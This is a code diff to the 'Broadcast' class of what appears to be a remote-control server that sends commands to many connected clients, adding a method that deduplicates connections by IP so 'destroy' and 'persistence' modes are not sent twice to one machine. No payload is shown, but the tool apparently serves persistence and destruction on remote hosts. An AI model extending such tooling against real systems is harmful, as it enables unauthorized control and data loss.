@@ -31,6 +31,36 @@ class Broadcast:
 -b or --back : Back to menu.
 """) 
 
+    def aSingleRunMod(self):
+        '''
+        Allows you not to send the same modes multiple times on the same machine. 
+        This method is very useful for the destroy mode and persistence mode. 
+        Once the test is finished it sends a list with all the sockets. 
+        '''
+        pass
+
+        dict_sorts = {}
+#Handler.dict_conn[Handler.number_conn] = [Handler.number_conn,self.conn, self.address[0], int(self.address[1]), True, info[0], info[1], info[2],info[3], False] #3 #True = Connexion is life 
+
+        for key in Handler.dict_conn.keys():
+            
+            if(key == 0): #if first iteration
+                dict_sorts[key] = [key,Handler.dict_conn[key][NB_SOCKET], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]]
+                print("--------->>>>",dict_sorts[key])
+            
+            else:
+                
+                for key2 in dict_sorts.keys(): #if doublon not add in dict
+                    if(dict_sorts[key2][NB_IP] == Handler.dict_conn[key][NB_IP]):
+                        print("ip doublon:")
+                        print(dict_sorts[key2][0], "==", Handler.dict_conn[key][0])
+                
+                    else: #if not doublon add in dict:
+                        dict_sorts[key] = [key,Handler.dict_conn[key][NB_SOCKET], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]]
+            
+        print(dict_sorts)
+        print(len(dict_sorts))         
+        return dict_sorts
     
     def executeCommand(self,cmd_list):
         '''-c'''
@@ -62,7 +92,7 @@ class Broadcast:
             print("\n")
             for key in Handler.dict_conn.keys():
                 if(Handler.dict_conn[key][NB_ALIVE]):
-                    if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
+                    if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request,False): 
                         printColor("information","[-] Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
                         
                         try:
@@ -91,6 +121,8 @@ class Broadcast:
         With the "broadcast" argument of MOD_PERSISTENCE, the client does not send a response. It simply executes the persistence. 
         '''
 
+        self.aSingleRunMod()
+        
         request = ""
 
         if not(whitout_MOD_ALL): 
